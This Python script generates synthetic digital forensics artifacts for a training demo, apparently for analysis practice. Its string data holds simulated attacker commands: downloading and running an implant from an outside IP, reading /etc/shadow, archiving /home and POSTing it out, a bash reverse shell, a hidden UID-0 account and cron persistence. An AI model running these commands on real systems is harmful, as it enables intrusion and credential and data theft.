#!/usr/bin/env python3
"""
generate_demo_evidence.py
Generates synthetic digital forensics evidence artifacts for Demo 03.
Writes files to /evidence/ (shared Docker volume).
"""
import os
import json
import hashlib
import datetime

EVIDENCE_DIR = os.environ.get("EVIDENCE_DIR", "/evidence")
os.makedirs(EVIDENCE_DIR, exist_ok=True)


def write(filename, content):
    path = os.path.join(EVIDENCE_DIR, filename)
    with open(path, "w") as f:
        f.write(content)
    digest = hashlib.sha256(content.encode()).hexdigest()
    print(f"[+] {filename}  sha256={digest[:16]}...")
    return path


def main():
    print(f"Generating forensic evidence artifacts in {EVIDENCE_DIR} ...")

    # 1. Suspicious bash history
    write("bash_history.txt", """cd /tmp
wget http://185.220.101.45/implant.sh -O .update.sh
chmod +x .update.sh
./.update.sh &
cat /etc/passwd
cat /etc/shadow
tar czf /tmp/exfil.tar.gz /home
curl -s -X POST http://185.220.101.45:4443/data --data-binary @/tmp/exfil.tar.gz
rm -f /tmp/exfil.tar.gz .update.sh
history -c
""")

    # 2. Prefetch-style process list (simulated)
    procs = [
        {"pid": 1, "ppid": 0, "cmd": "systemd", "user": "root", "start": "2024-03-14T07:00:01"},
        {"pid": 412, "ppid": 1, "cmd": "sshd", "user": "root", "start": "2024-03-14T07:00:15"},
        {"pid": 1892, "ppid": 412, "cmd": "sshd: bob [priv]", "user": "root", "start": "2024-03-14T22:14:33"},
        {"pid": 1893, "ppid": 1892, "cmd": "bash", "user": "bob", "start": "2024-03-14T22:14:33"},
        {"pid": 2104, "ppid": 1893, "cmd": "wget http://185.220.101.45/implant.sh -O .update.sh",
         "user": "bob", "start": "2024-03-14T22:16:01"},
        {"pid": 2107, "ppid": 1893, "cmd": "./.update.sh", "user": "bob", "start": "2024-03-14T22:16:12"},
        {"pid": 2108, "ppid": 2107, "cmd": "bash -i >& /dev/tcp/185.220.101.45/4444 0>&1",
         "user": "bob", "start": "2024-03-14T22:16:12"},
    ]
    write("process_list.json", json.dumps(procs, indent=2))

    # 3. Simulated network connections at time of incident
    conns = [
        {"proto": "tcp", "local": "10.0.0.22:22", "remote": "192.168.10.5:54321",
         "state": "ESTABLISHED", "pid": 1893, "cmd": "sshd"},
        {"proto": "tcp", "local": "10.0.0.22:48921", "remote": "185.220.101.45:4444",
         "state": "ESTABLISHED", "pid": 2108, "cmd": "bash"},
        {"proto": "tcp", "local": "10.0.0.22:49100", "remote": "185.220.101.45:4443",
         "state": "CLOSE_WAIT", "pid": 2108, "cmd": "bash"},
    ]
    write("network_connections.json", json.dumps(conns, indent=2))

    # 4. /etc/passwd snippet (shows suspicious account)
    write("passwd_snapshot.txt", """root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bob:x:1001:1001:Bob Smith:/home/bob:/bin/bash
sysbackup:x:0:0:System Backup:/root:/bin/bash
""")
    # Note: sysbackup has UID 0 — suspicious!

    # 5. Crontab with persistence mechanism
    write("crontab_root.txt", """# m h dom mon dow command
*/5 * * * * /usr/local/bin/.sys-update --quiet >/dev/null 2>&1
0 3 * * * /usr/bin/find /tmp -name "*.sh" -exec bash {} \\;
""")

    # 6. Hash manifest for integrity checking
    manifest = {}
    for fname in os.listdir(EVIDENCE_DIR):
        fpath = os.path.join(EVIDENCE_DIR, fname)
        if os.path.isfile(fpath) and fname != "manifest.json":
            with open(fpath, "rb") as f:
                manifest[fname] = hashlib.sha256(f.read()).hexdigest()
    write("manifest.json", json.dumps(manifest, indent=2))

    print(f"\nGenerated {len(os.listdir(EVIDENCE_DIR))} evidence files in {EVIDENCE_DIR}")
    print("Evidence collection complete. Files are ready for forensic analysis.")


if __name__ == "__main__":
    main()
